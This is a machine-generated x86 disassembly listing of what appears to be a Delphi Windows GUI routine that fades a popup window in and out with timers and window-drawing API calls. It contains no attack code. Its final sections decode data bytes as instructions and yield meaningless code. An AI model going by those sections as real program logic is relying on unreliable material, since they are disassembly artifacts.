mov eax [ ebx + 0x260 ]
call sub_46e5d4
mov eax [ r-xdata ]
push eax
lea ecx [ ebx + 0x274 ]
lea edx [ esp + 0x34 ]
mov eax [ ebx + 0x260 ]
call sub_46e5d4
lea ecx [ esp + 0x40 ]
lea edx [ esp + 0x30 ]
lea eax [ esp + 0x20 ]
call sub_432970
push esi
push edi
lea esi [ esp + 0x48 ]
lea edi [ esp + 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ r-xdata ]
push eax
lea ecx [ ebx + 0x274 ]
lea edx [ esp + 0x24 ]
mov eax [ ebx + 0x260 ]
call sub_46e5d4
push edi
mov eax [ ebx + 0x260 ]
call sub_46e8c8
push eax
call SelectObject
push esi
call DeleteObject
add esp 0x50
pop edi
pop esi
pop ebx
retn
sub_49d140
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_49d23d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x80 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49d244
lea eax [ ebp - 0x14 ]
mov edx 0x3
call j_sub_44936c
retn
mov edx [ edi + 0x80 ]
mov eax r-xdata
call sub_43b058
mov esi eax
lea edx [ ebp - 0xc ]
mov eax [ edi + 0x80 ]
call sub_48aa9c
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x30 ]
call sub_449d2c
test esi esi
je r-xdata
lea eax [ ebx + 0x34 ]
xor edx edx
call sub_449d2c
lea edx [ ebp - 0x10 ]
mov eax [ edi + 0x80 ]
call sub_48aae4
mov edx [ ebp - 0x10 ]
lea eax [ ebx + 0x34 ]
call sub_449d2c
jmp r-xdata
mov [ ebx + 0x3c ] 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax [ ebx + 0x34 ]
call sub_44a368
mov eax [ ebp - 0x14 ]
call sub_435884
mov [ ebx + 0x3c ] eax
lea eax [ ebx + 0x34 ]
push eax
mov ecx esi
dec ecx
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_44a368
jmp r-xdata
mov edx [ ebx + 0x34 ]
mov eax r-xdata
call sub_43b058
mov esi eax
test esi esi
je r-xdata
mov [ ebx + 0x54 ] edi
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_49d2f4
sub_49d25c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x4c ] 0x1
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_49ca70
mov esi eax
mov [ esi + 0x268 ] ebx
mov eax esi
call sub_496844
lea eax [ esi + 0x270 ]
mov edx [ ebx + 0x30 ]
call sub_449d2c
lea eax [ esi + 0x274 ]
mov edx [ ebx + 0x34 ]
call sub_449d2c
mov eax [ ebx + 0x3c ]
mov [ esi + 0x278 ] eax
mov edx esp
mov eax esi
call sub_49cbac
mov [ ebx + 0x58 ] 0x0
mov eax [ ebx + 0x44 ]
test eax eax
jne r-xdata
mov edx esi
call sub_49d9d8
mov eax [ ebx + 0x44 ]
call sub_49d9e4
push ebx
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_49d330
mov [ ebx + 0x44 ] eax
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_49d2f4
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ esp + 0x4 ]
push edi
lea eax [ esp + 0xc ]
push eax
mov esi [ esp + 0x8 ]
mov ecx esi
mov edx edi
mov eax esi
call sub_432a2c
lea edx [ esp + 0x8 ]
mov eax ebx
call sub_49d25c
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_49d330
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_42dc58
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_433168
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4249e8
mov esi eax
mov [ ebx + 0x40 ] esi
mov [ esi + 0x20 ] 0x1
mov edx edi
mov eax ebx
call sub_49d9d8
mov [ ebx + 0x48 ] 0x0
mov [ ebx + 0x49 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x44 ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_49d3b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
call sub_44873c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x49 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_49d9e4
movzx edx [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_42dd60
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424b88
mov edi eax
xor eax eax
push ebp
push sub_49d437
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49d43e
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424bec
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4246e8
call sub_4481b0
inc esi
dec ebx
jne r-xdata
sub_49d43e
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424b40
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_4481b0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
call sub_4481b0
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4486e4
sub_49d474
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_49d56a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424b88
mov edi eax
xor eax eax
push ebp
push sub_49d520
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49d527
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424bec
retn
inc ebx
xor esi esi
xor edx edx
mov eax edi
call sub_4246e8
mov edx eax
mov eax [ ebp - 0xc ]
call sub_424590
xor edx edx
mov eax edi
call sub_4245dc
xor edx edx
mov eax edi
call sub_4246e8
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
cmp esi eax
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_49d527
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49d571
mov eax [ ebp - 0xc ]
call sub_4481b0
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4246e8
push eax
push sub_4481b0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42e138
inc esi
dec ebx
jne r-xdata
sub_49d57c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x49 ] 0x0
jne r-xdata
mov [ ebp - 0x12 ] 0x1
push ebp
call sub_49d474
pop ecx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
xor eax eax
push ebp
push sub_49d983
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_496c14
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x268 ]
mov eax [ eax + 0x48 ]
push eax
call Sleep
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x268 ]
cmp [ eax + 0x4c ] 0x0
je r-xdata
push 0x3
push 0x0
push 0xff00
mov eax [ ebp - 0x10 ]
call sub_496868
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
call sub_4331b4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
push sub_4481b0
mov eax [ ebp - 0x4 ]
call sub_42e138
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424b88
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_49d97b
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax [ ebp - 0x20 ]
call sub_4245dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49d982
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424bec
retn
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x10 ]
call sub_496c14
test al al
je r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
push sub_49cb90
mov eax [ ebp - 0x4 ]
call sub_42e138
mov eax [ ebp - 0x10 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xdc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_42e138
push 0x4
mov eax [ ebp - 0x10 ]
call sub_496868
push eax
call ShowWindow
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x8 ] 0x1
mov eax [ ebp - 0x10 ]
call sub_496c14
test al al
je r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4c ] eax
mov eax [ ebp - 0x10 ]
call sub_496c14
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424b88
mov edi eax
xor eax eax
push ebp
push sub_49d6d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi + 0x8 ]
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49d6de
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424bec
retn
push 0x3
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
fmul [ r-xdata ]
call sub_44796c
push eax
push 0xff00
mov eax [ ebp - 0x10 ]
call sub_496868
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x268 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
push 0x3
push 0xff
push 0xff00
mov eax [ ebp - 0x10 ]
call sub_496868
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
jmp r-xdata
push 0x14
call Sleep
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424b88
mov ebx eax
xor eax eax
push ebp
push sub_49d799
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49d7a0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424bec
retn
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov [ ebp - 0x8 ] 0xa
mov eax [ ebp - 0x10 ]
call sub_496c14
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424b88
mov esi eax
xor eax eax
push ebp
push sub_49d88c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x8 ]
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49d893
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424bec
retn
push 0x3
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
fmul [ r-xdata ]
call sub_44796c
push eax
push 0xff00
mov eax [ ebp - 0x10 ]
call sub_496868
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_49d6de
cmp [ ebp - 0x18 ] 0x1
jle r-xdata
push 0x14
call Sleep
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0xb
jne r-xdata
push ebp
call sub_49d474
pop ecx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x11 ] 0x1
mov eax [ ebp - 0xc ]
call sub_49d138
jmp r-xdata
mov eax [ ebp - 0x10 ]
call sub_496c14
test al al
je r-xdata
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424b88
mov edi eax
xor eax eax
push ebp
push sub_49d6d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi + 0x8 ]
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49d6de
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424bec
retn
push 0x3
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
fmul [ r-xdata ]
call sub_44796c
push eax
push 0xff00
mov eax [ ebp - 0x10 ]
call sub_496868
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x10 ]
call sub_496c14
test al al
je r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4c ] eax
mov eax [ ebp - 0x10 ]
call sub_496c14
test al al
je r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
push sub_49cb90
mov eax [ ebp - 0x4 ]
call sub_42e138
mov eax [ ebp - 0x10 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xdc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_42e138
push 0x4
mov eax [ ebp - 0x10 ]
call sub_496868
push eax
call ShowWindow
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x268 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
push 0x3
push 0xff
push 0xff00
mov eax [ ebp - 0x10 ]
call sub_496868
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
jmp r-xdata
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x8 ] 0x1
push 0x14
call Sleep
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424b88
mov ebx eax
xor eax eax
push ebp
push sub_49d799
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49d7a0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424bec
retn
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov [ ebp - 0x8 ] 0xa
mov eax [ ebp - 0x10 ]
call sub_496c14
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424b88
mov esi eax
xor eax eax
push ebp
push sub_49d88c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x8 ]
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49d893
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424bec
retn
push 0x3
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
fmul [ r-xdata ]
call sub_44796c
push eax
push 0xff00
mov eax [ ebp - 0x10 ]
call sub_496868
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_49d7a0
cmp [ ebp - 0x18 ] 0x1
jle r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x268 ]
cmp [ eax + 0x50 ] 0xffffffff
je r-xdata
push ebp
call sub_49d474
pop ecx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x11 ] 0x1
mov eax [ ebp - 0xc ]
call sub_49d138
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x268 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov edx [ ebp - 0x10 ]
mov edx [ edx + 0x268 ]
cmp eax [ edx + 0x50 ]
jbe r-xdata
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
push 0x14
call Sleep
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424b88
mov ebx eax
xor eax eax
push ebp
push sub_49d799
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49d7a0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424bec
retn
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x268 ]
call sub_49cf04
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x10 ]
call sub_496c14
test al al
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov eax [ ebp - 0x10 ]
call sub_496c14
test al al
je r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
push sub_49cb90
mov eax [ ebp - 0x4 ]
call sub_42e138
mov eax [ ebp - 0x10 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xdc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_42e138
push 0x4
mov eax [ ebp - 0x10 ]
call sub_496868
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424b88
mov esi eax
xor eax eax
push ebp
push sub_49d88c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x8 ]
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49d893
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424bec
retn
push 0x3
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
fmul [ r-xdata ]
call sub_44796c
push eax
push 0xff00
mov eax [ ebp - 0x10 ]
call sub_496868
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x8 ] 0x1
mov eax [ ebp - 0x10 ]
call sub_496c14
test al al
je r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4c ] eax
mov eax [ ebp - 0x10 ]
call sub_496c14
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424b88
mov edi eax
xor eax eax
push ebp
push sub_49d6d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi + 0x8 ]
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49d6de
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424bec
retn
push 0x3
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
fmul [ r-xdata ]
call sub_44796c
push eax
push 0xff00
mov eax [ ebp - 0x10 ]
call sub_496868
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push 0x3
push 0xff
push 0xff00
mov eax [ ebp - 0x10 ]
call sub_496868
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
jmp r-xdata
sub_49d893
cmp [ ebp - 0x18 ] 0x1
jle r-xdata
push 0x14
call Sleep
dec [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
push ebp
call sub_49d474
pop ecx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x11 ] 0x1
mov eax [ ebp - 0xc ]
call sub_49d138
jmp r-xdata
mov eax [ ebp - 0x10 ]
call sub_496c14
test al al
je r-xdata
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424b88
mov esi eax
xor eax eax
push ebp
push sub_49d88c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x8 ]
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49d893
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424bec
retn
push 0x3
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
fmul [ r-xdata ]
call sub_44796c
push eax
push 0xff00
mov eax [ ebp - 0x10 ]
call sub_496868
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x10 ]
call sub_496c14
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424b88
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_49d90d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424bec
retn
cmp [ ebp - 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
push sub_49cb90
mov eax [ ebp - 0x4 ]
call sub_42e138
mov eax [ ebp - 0x10 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xdc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_42e138
push 0x4
mov eax [ ebp - 0x10 ]
call sub_496868
push eax
call ShowWindow
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x8 ] 0x1
mov eax [ ebp - 0x10 ]
call sub_496c14
test al al
je r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4c ] eax
mov eax [ ebp - 0x10 ]
call sub_496c14
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424b88
mov edi eax
xor eax eax
push ebp
push sub_49d6d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi + 0x8 ]
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49d6de
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424bec
retn
push 0x3
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
fmul [ r-xdata ]
call sub_44796c
push eax
push 0xff00
mov eax [ ebp - 0x10 ]
call sub_496868
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x268 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
push 0x3
push 0xff
push 0xff00
mov eax [ ebp - 0x10 ]
call sub_496868
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
jmp r-xdata
push 0x14
call Sleep
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424b88
mov ebx eax
xor eax eax
push ebp
push sub_49d799
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49d7a0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_424bec
retn
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov [ ebp - 0x8 ] 0xa
sub_49d9f0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_49da4f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49da56
retn
mov eax rw-data
call sub_43bfe8
call sub_49c3b4
mov eax rw-data
call j_sub_449348
mov eax rw-data
call j_sub_449348
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_44a7e8
sub_49da58
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_49dad7
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49dade
retn
call GetVersion
cmp al 0x4
setae [ rw-data ]
call sub_49c454
mov eax [ r-xdata ]
call sub_423d34
mov eax [ r-xdata ]
call sub_423dd4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_423d80
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_423d80
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_423d80
sub_49dae0
cld
mov [ esi ] cl
push es
inc [ eax ]
add ah bh
mov [ esi ] cl
pop es
inc [ eax ]
add ah bh
mov [ esi ] cl
or bh bh
add [ eax ] al
cld
mov [ esi ] cl
or edi edi
add [ eax ] al
cld
mov [ esi ] cl
or bh bh
add [ eax ] al
cld
mov [ esi ] cl
or edi edi
add [ eax ] al
cld
mov [ esi ] cl
or al 0xff
add [ eax ] al
cld
mov [ esi ] cl
or eax 0xfc0000ff
mov [ esi ] cl
push cs
inc [ eax ]
add ah bh
mov [ esi ] cl
ud0 eax [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_49db55
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49db5c
retn
sub_49df12
inc esp
add [ eax - 0x1d ] cl
inc edx
add [ esp + eax * 4 + 0x44 ] ch
add al bl
cmp ecx [ ecx ]
dec eax
add [ eax + eax + 0x64 ] 0xcc004481
aas
dec edx
add [ ebp + esi * 2 + 0x49 ] bl
add [ eax - 0x3fffb6d5 ] al
dec ebp
inc edx
add ah dh
inc edx
dec edx
add [ ebx + eax * 2 ] ah
dec edx
add [ eax ] dh
adc cl [ ecx ]
js r-xdata
add [ ecx + eax * 4 + 0x44 ] ah
add ah cl
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ edi + edi ] cl
dec edx
add [ eax - 0x73ffb691 ] al
jne r-xdata
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
add al bl
je r-xdata
insb
sub al 0xdf
dec ecx
add [ eax + 0x480049de ] ch
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
add [ eax + ebp * 2 + 0x49 ] bh
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax + 0x4c ] dh
dec edx
add ah ah
sbb eax 0x2d000049
dec ecx
add [ eax - 0x3fffb5c0 ] dl
sub [ ecx ] ecx
test al 0x41
dec edx
add [ eax - 0x43ffb6d3 ] bl
sub eax 0x2e500049
dec ecx
add [ esp + ebp + 0x49 ] dl
push eax
dec ecx
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add al dl
imul ecx [ ecx ] sub_49663c
in al 0xce
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
xor al 0x4c
dec ecx
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffffd44a2873
jle r-xdata
or al 0x49
insb
jae r-xdata
jo r-xdata
outsd
insb
sub al ah
dec ecx
add [ edi ] al
or edx [ esp + edx * 2 + 0x61 ]
bound eax [ ebx + 0x6f ]
outsb
je r-xdata
add ah ch
sub ecx [ ecx ]
xchg esp eax
jge r-xdata
push esp
sub al 0x49
add [ eax + 0x40048e1 ] bl
loopne r-xdata
jae r-xdata
jb r-xdata
adc [ eax ] al
pop es
inc ecx
outsb
